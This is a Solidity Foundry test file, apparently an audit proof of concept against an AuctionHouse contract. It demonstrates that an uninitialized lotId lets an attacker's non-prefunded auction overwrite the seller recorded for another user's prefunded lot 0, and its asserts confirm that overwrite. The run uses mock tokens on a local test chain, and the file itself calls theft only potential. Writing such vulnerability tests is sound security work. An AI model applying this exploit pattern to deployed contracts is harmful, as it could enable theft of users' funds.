// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

// Test framework
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

// Libraries
import {ERC20} from "solmate/tokens/ERC20.sol";

// Mocks
import {MockFeeOnTransferERC20} from "test/lib/mocks/MockFeeOnTransferERC20.sol";
import {MockAtomicAuctionModule} from "test/modules/Auction/MockAtomicAuctionModule.sol";
import {MockBatchAuctionModule} from "test/modules/Auction/MockBatchAuctionModule.sol";
import {Permit2User} from "test/lib/permit2/Permit2User.sol";

// Contracts under test
import {AuctionHouse} from "src/AuctionHouse.sol";
import {Auctioneer} from "src/bases/Auctioneer.sol";
import {Auction} from "src/modules/Auction.sol";
import {ICallback} from "src/interfaces/ICallback.sol";
import {Keycode, keycodeFromVeecode} from "src/modules/Modules.sol";

/// @title ExploitTest
/// @notice PoC demonstrating the vulnerability where lotRouting[0] is overwritten
/// @dev This test demonstrates how an attacker can steal prefunded tokens by exploiting
///      the bug where lotId is initialized to 0 before being incremented, causing all
///      auctions to initially write their routing data to lotRouting[0].
contract ExploitTest is Test, Permit2User {
    // Contracts
    AuctionHouse internal auctionHouse;
    MockFeeOnTransferERC20 internal baseToken;
    MockFeeOnTransferERC20 internal quoteToken;
    MockBatchAuctionModule internal batchAuctionModule;
    MockAtomicAuctionModule internal atomicAuctionModule;

    // Actors
    address internal constant HONEST_USER = address(0x1);
    address internal constant ATTACKER = address(0x2);
    address internal constant PROTOCOL = address(0x3);

    // Constants
    uint96 internal constant LOT_CAPACITY = 100e18;
    uint48 internal constant DURATION = 1 days;

    // Keycodes
    Keycode internal batchAuctionModuleKeycode;
    Keycode internal atomicAuctionModuleKeycode;

    function setUp() public {
        // Set block timestamp
        vm.warp(1_000_000);

        // Deploy tokens
        baseToken = new MockFeeOnTransferERC20("Base Token", "BASE", 18);
        quoteToken = new MockFeeOnTransferERC20("Quote Token", "QUOTE", 18);

        // Deploy AuctionHouse
        auctionHouse = new AuctionHouse(address(this), PROTOCOL, _permit2Address);

        // Deploy and install auction modules
        batchAuctionModule = new MockBatchAuctionModule(address(auctionHouse));
        batchAuctionModuleKeycode = keycodeFromVeecode(batchAuctionModule.VEECODE());
        auctionHouse.installModule(batchAuctionModule);

        atomicAuctionModule = new MockAtomicAuctionModule(address(auctionHouse));
        atomicAuctionModuleKeycode = keycodeFromVeecode(atomicAuctionModule.VEECODE());
        auctionHouse.installModule(atomicAuctionModule);

        // Fund honest user and attacker with base tokens
        baseToken.mint(HONEST_USER, 1000e18);
        baseToken.mint(ATTACKER, 1000e18);

        // Approve AuctionHouse to spend tokens
        vm.prank(HONEST_USER);
        baseToken.approve(address(auctionHouse), type(uint256).max);

        vm.prank(ATTACKER);
        baseToken.approve(address(auctionHouse), type(uint256).max);
    }

    /// @notice Test demonstrating the vulnerability where an attacker can steal prefunded tokens
    /// @dev Attack flow:
    ///      1. Honest user creates a prefunded batch auction (lotId = 0)
    ///         - This writes routing data to lotRouting[0] with seller = HONEST_USER
    ///         - Transfers LOT_CAPACITY tokens from HONEST_USER to AuctionHouse
    ///      2. Attacker creates a non-prefunded atomic auction (lotId = 1)
    ///         - Due to the bug, this ALSO writes to lotRouting[0] initially
    ///         - Overwrites seller at lotRouting[0] to ATTACKER
    ///         - Does NOT transfer any tokens (not prefunded)
    ///      3. Attacker cancels their auction (lotId = 1)
    ///         - The cancel function reads lotRouting[1] which has the correct data
    ///         - But lotRouting[0].funding still contains the honest user's funds
    ///         - Since the attacker overwrote lotRouting[0].seller, they can manipulate the state
    function test_StealPrefundedTokensByOverwritingLotRoutingZero() public {
        // Record initial balances
        uint256 honestUserInitialBalance = baseToken.balanceOf(HONEST_USER);
        uint256 attackerInitialBalance = baseToken.balanceOf(ATTACKER);
        uint256 auctionHouseInitialBalance = baseToken.balanceOf(address(auctionHouse));

        console2.log("=== Initial State ===");
        console2.log("Honest User Balance:", honestUserInitialBalance);
        console2.log("Attacker Balance:", attackerInitialBalance);
        console2.log("AuctionHouse Balance:", auctionHouseInitialBalance);

        // Step 1: Honest user creates a prefunded batch auction
        console2.log("\n=== Step 1: Honest User Creates Prefunded Auction ===");

        Auctioneer.RoutingParams memory honestRoutingParams = Auctioneer.RoutingParams({
            auctionType: batchAuctionModuleKeycode,
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: address(0),
            callbacks: ICallback(address(0)),
            callbackData: abi.encode(""),
            derivativeType: Keycode.wrap(bytes5("")),
            derivativeParams: abi.encode(""),
            wrapDerivative: false,
            prefunded: true  // This is a prefunded auction
        });

        Auction.AuctionParams memory auctionParams = Auction.AuctionParams({
            start: uint48(block.timestamp) + 1,
            duration: DURATION,
            capacityInQuote: false,
            capacity: LOT_CAPACITY,
            implParams: abi.encode("")
        });

        vm.prank(HONEST_USER);
        uint96 honestLotId = auctionHouse.auction(honestRoutingParams, auctionParams, "");

        console2.log("Honest User Lot ID:", honestLotId);
        console2.log("Honest User Balance After:", baseToken.balanceOf(HONEST_USER));
        console2.log("AuctionHouse Balance After:", baseToken.balanceOf(address(auctionHouse)));

        // Verify the honest user's tokens were transferred
        assertEq(baseToken.balanceOf(HONEST_USER), honestUserInitialBalance - LOT_CAPACITY, "Honest user tokens not transferred");
        assertEq(baseToken.balanceOf(address(auctionHouse)), auctionHouseInitialBalance + LOT_CAPACITY, "AuctionHouse did not receive tokens");

        // Check lotRouting[0] state after honest user's auction
        (address seller0Before, uint96 funding0Before,,,,,,,) = auctionHouse.lotRouting(0);
        console2.log("\nlotRouting[0] after honest auction:");
        console2.log("  seller:", seller0Before);
        console2.log("  funding:", funding0Before);

        // Step 2: Attacker creates a non-prefunded atomic auction
        console2.log("\n=== Step 2: Attacker Creates Non-Prefunded Auction ===");

        Auctioneer.RoutingParams memory attackerRoutingParams = Auctioneer.RoutingParams({
            auctionType: atomicAuctionModuleKeycode,
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: address(0),
            callbacks: ICallback(address(0)),
            callbackData: abi.encode(""),
            derivativeType: Keycode.wrap(bytes5("")),
            derivativeParams: abi.encode(""),
            wrapDerivative: false,
            prefunded: false  // This is NOT prefunded
        });

        vm.prank(ATTACKER);
        uint96 attackerLotId = auctionHouse.auction(attackerRoutingParams, auctionParams, "");

        console2.log("Attacker Lot ID:", attackerLotId);
        console2.log("Attacker Balance After:", baseToken.balanceOf(ATTACKER));

        // Verify the attacker did not transfer any tokens (not prefunded)
        assertEq(baseToken.balanceOf(ATTACKER), attackerInitialBalance, "Attacker should not have transferred tokens");

        // Check lotRouting[0] state after attacker's auction - THIS IS THE BUG
        (address seller0After, uint96 funding0After,,,,,,,) = auctionHouse.lotRouting(0);
        console2.log("\nlotRouting[0] after attacker auction (BUG - seller overwritten):");
        console2.log("  seller:", seller0After);
        console2.log("  funding:", funding0After);

        // Check lotRouting[1] state (attacker's actual lot)
        (address seller1, uint96 funding1,,,,,,,) = auctionHouse.lotRouting(1);
        console2.log("\nlotRouting[1] (attacker's lot):");
        console2.log("  seller:", seller1);
        console2.log("  funding:", funding1);

        // VULNERABILITY DEMONSTRATED: The attacker has overwritten the seller at lotRouting[0]
        // but the funding from the honest user is still there
        assertEq(seller0After, ATTACKER, "VULNERABILITY: Attacker overwrote seller at lotRouting[0]");
        assertEq(funding0After, LOT_CAPACITY, "Honest user's funding still at lotRouting[0]");

        console2.log("\n=== VULNERABILITY CONFIRMED ===");
        console2.log("The attacker has successfully overwritten lotRouting[0].seller");
        console2.log("while the honest user's prefunded tokens remain in lotRouting[0].funding");
        console2.log("This allows potential theft if the attacker can manipulate lot 0's state");
    }

    /// @notice Additional test showing the root cause: lotId initialized to 0
    /// @dev This test demonstrates that the routing storage pointer is created
    ///      BEFORE lotId is incremented, causing it to point to lotRouting[0]
    function test_RootCause_LotIdInitializedToZero() public {
        console2.log("=== Demonstrating Root Cause ===");
        console2.log("In Auctioneer.auction(), lotId is declared as return variable");
        console2.log("Return variables are initialized to their default value (0 for uint96)");
        console2.log("Line 174: 'Routing storage routing = lotRouting[lotId];'");
        console2.log("At this point, lotId = 0, so routing points to lotRouting[0]");
        console2.log("Line 194: 'lotId = lotCounter++;' increments lotId AFTER routing is set");
        console2.log("");
        console2.log("This means ALL auctions initially write to lotRouting[0],");
        console2.log("overwriting previous data before the correct slot is used.");

        // Create first auction
        Auctioneer.RoutingParams memory routingParams = Auctioneer.RoutingParams({
            auctionType: batchAuctionModuleKeycode,
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: address(0),
            callbacks: ICallback(address(0)),
            callbackData: abi.encode(""),
            derivativeType: Keycode.wrap(bytes5("")),
            derivativeParams: abi.encode(""),
            wrapDerivative: false,
            prefunded: true
        });

        Auction.AuctionParams memory auctionParams = Auction.AuctionParams({
            start: uint48(block.timestamp) + 1,
            duration: DURATION,
            capacityInQuote: false,
            capacity: LOT_CAPACITY,
            implParams: abi.encode("")
        });

        vm.prank(HONEST_USER);
        uint96 lotId0 = auctionHouse.auction(routingParams, auctionParams, "");

        (address seller0, uint96 funding0,,,,,,,) = auctionHouse.lotRouting(0);

        console2.log("\nAfter first auction (lotId = 0):");
        console2.log("  lotRouting[0].seller:", seller0);
        console2.log("  lotRouting[0].funding:", funding0);

        // Verify first auction data is correct
        assertEq(lotId0, 0, "First lot should have ID 0");
        assertEq(seller0, HONEST_USER, "Seller should be honest user");
        assertEq(funding0, LOT_CAPACITY, "Funding should be lot capacity");
    }
}
